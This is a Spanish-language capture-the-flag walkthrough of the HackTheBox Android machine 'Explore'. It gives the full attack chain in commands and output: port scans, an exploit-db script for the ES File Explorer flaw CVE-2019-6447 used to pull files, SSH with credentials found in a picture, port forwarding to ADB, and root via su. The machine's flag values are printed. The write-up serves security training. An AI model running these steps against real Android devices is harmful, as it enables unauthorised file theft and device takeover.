---
layout: single
title: Explore - HackTheBox
excerpt: "Explore es una máquina Android creada por bertolls, en esta máquina encontraremos unas credenciales de acceso al servicio ssh mediante un exploit, una vez tenemos acceso a la
máquina encontraremos un puerto interno al cual tendrémos acceso a este servicio gracias a un local port forwarding, elevaremos privilegios usando el la herramienta adb."
date: 2021-11-02
classes: wide
header:
  teaser: /assets/images/htb-Explore/Explore.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - android
  - fácil
tags:
  - hackthebox
  - exploit
  - adb
  - local port forwarding 
  - bertolls
---

### Escaneo de puertos
```bash
❯ nmap -p- --open -T5 -v -n 10.10.10.247

PORT      STATE SERVICE
2222/tcp  open  EtherNetIP-1
41127/tcp open  unknown
42135/tcp open  unknown
59777/tcp open  unknown
```

### Escaneo de servicios
```bash
❯ nmap -sCV -p 2222,41127,42135,59777 10.10.10.247
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-02 00:23 CET
Nmap scan report for 10.10.10.247
Host is up (0.046s latency).

PORT      STATE SERVICE VERSION
2222/tcp  open  ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-SSH Server - Banana Studio
| ssh-hostkey: 
|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
41127/tcp open  unknown
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.0 400 Bad Request
|     Date: Mon, 01 Nov 2021 23:38:25 GMT
|     Content-Length: 22
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line:

|   TerminalServerCookie: 
|     HTTP/1.0 400 Bad Request
|     Date: Mon, 01 Nov 2021 23:38:45 GMT
|     Content-Length: 54
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|_    Cookie: mstshash=nmap
42135/tcp open  http    ES File Explorer Name Response httpd
|_http-title: Site doesn't have a title (text/html).
59777/tcp open  http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
|_http-title: Site doesn't have a title (text/plain).
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port2222-TCP:V=7.92%I=7%D=11/2%Time=618076E0%P=x86_64-pc-linux-gnu%r(NU
SF:LL,24,"SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port41127-TCP:V=7.92%I=7%D=11/2%Time=618076DF%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,AA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Mon,\x20
SF:01\x20Nov\x202021\x2023:38:25\x20GMT\r\nContent-Length:\x2022\r\nConten
SF:t-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\

SF:\x2071\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnectio
SF:n:\x20Close\r\n\r\nInvalid\x20request\x20line:\x20\x16\x03\0\0i\x01\0\0
SF:e\x03\x03U\x1c\?\?random1random2random3random4\0\0\x0c\0/\0");
Service Info: Device: phone
```

### Exploitdb
Me voy a exploitdb y hago una busqueda de: `ES File Explorer` y encuentro este exploit `https://www.exploit-db.com/exploits/50070` 

### Modo de uso
```bash
❯ python3 exploit.py -h
USAGE exploit.py <command> <IP> [file to download]
```

### Comandos disponibles 
```bash
❯ python3 exploit.py help .
[-] WRONG COMMAND!
Available commands : 
  listFiles         : List all Files.
  listPics          : List all Pictures.
  listVideos        : List all videos.
  listAudios        : List all audios.
  listApps          : List Applications installed.
  listAppsSystem    : List System apps.
  listAppsPhone     : List Communication related apps.
  listAppsSdcard    : List apps on the SDCard.
  listAppsAll       : List all Application.
  getFile           : Download a file.
  getDeviceInfo     : Get device info.
  ```

### getDeviceInfo
```bash
❯ python3 exploit.py getDeviceInfo 10.10.10.247

==================================================================
|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
|                Coded By : Nehal a.k.a PwnerSec                 |
==================================================================

name : VMware Virtual Platform
ftpRoot : /sdcard
ftpPort : 3721
```

### listPics
Lanzo un  `listPics` y veo una ruta que me llama la atención.

![](/assets/images/htb-Explore/listPics.png)

### getFile
Con `getFile` me descargo la imagen.

![](/assets/images/htb-Explore/getFile.png)

Abro la imagen y veo unas posibles credenciales de acceso.

![](/assets/images/htb-Explore/kristi.png)

### SSH
Pruebo las credenciales de acceso con el servicio ssh.

`❯ ssh kristi@10.10.10.247 -p 2222`

![](/assets/images/htb-Explore/android.png)

Me desplazo a la ruta `/sdcard` para leer la flag de user.txt.
```bash
:/sdcard $ cat user.txt                                                        
f32017174c7c7e8f50c6da52891ae250
```

Lanzo un ss para ver los puertos abiertos de la máquina, veo el puerto 5555 abierto en local.

![](/assets/images/htb-Explore/ltun.png)

Aplico un local port forwarding.

`ssh kristi@10.10.10.247 -p 2222 -L 5555:127.0.0.1:5555`
### ADB
Las siglas adb `Android Debug Bridge` es un sistema de comandos que permite administrar un dispositivo android desde la terminal.
```bash
❯ adb connect localhost:5555
* daemon not running; starting now at tcp:5037
* daemon started successfully
connected to localhost:5555
```

ADB shell.
```bash
❯ adb -s localhost:5555 shell
```

### ROOT

Una vez obtengo la shell, puedo elevar privilegios directamente con `su`.
```bash
x86_64:/ $ su
:/ # 
```

Ahora busco el fichero root.txt para obtener la flag.
```bash
:/ # find / -name "root.txt" 2>/dev/null
/data/root.txt
:/ # cat /data/root.txt                                                      
f04fc82b6d49b41c9b08982be59338c5
```
